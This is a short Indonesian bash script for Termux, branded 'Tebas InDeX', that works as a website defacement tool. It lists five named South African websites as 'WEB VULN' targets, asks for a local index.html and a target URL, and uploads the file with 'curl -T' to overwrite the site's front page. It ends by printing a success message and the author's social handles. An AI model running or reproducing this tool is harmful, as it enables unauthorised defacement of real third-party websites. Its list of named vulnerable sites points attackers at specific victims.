#!/bin/bash
#Cie yang recode , hargai karya orang;)
#YouTube Randi oloy

pkg install lolcat
pkg install figlet
pkg install cosway
pkg install libcurl
pkg install curl
pip2 install request
pip2 install mechanize

clear
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo
pur='\033[35;1m' #purple
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah
pu='\033[37;1m' #putih
ku='\033[33;1m' #kuning
mer='\033[41;97m' #Tepi
st='\033[0m' #Stop

echo $mer"=========================================="$st
echo $bi"Author : RandiSr"
echo $ku"YouTube: RANDI OLOYY"
echo $pur"Tools  : Tebas InDeX"
echo $mer"=========================================="$st
sleep 6
clear
echo ""
echo $ku"|========WEB VULN========|"
echo $me"http://gangways.co.za/"
echo $ku"http://ibp.ht.co.za/"
echo $me"http://fall.arrest.co.za/"
echo $ku"http://capewinedirect.co.za"
echo $me"http://liteoptec.co.za"
echo $i"===================================" $st
sleep 2
read -p"Nama Script Harus (index.html) : " script;
sleep 4
read -p"Masukan Web!! : " web;
echo $i"Waitttt....."
clear
sleep 3
clear
echo $i"Bentarr Say"
sleep 3
clead
echo $i"Proses...."
termux-setup-storage
curl -T /storage/emulated/0/$script $web
sleep 4
echo $ku"Follow Ig @RanOloy"
echo $ku"Succes.........;)"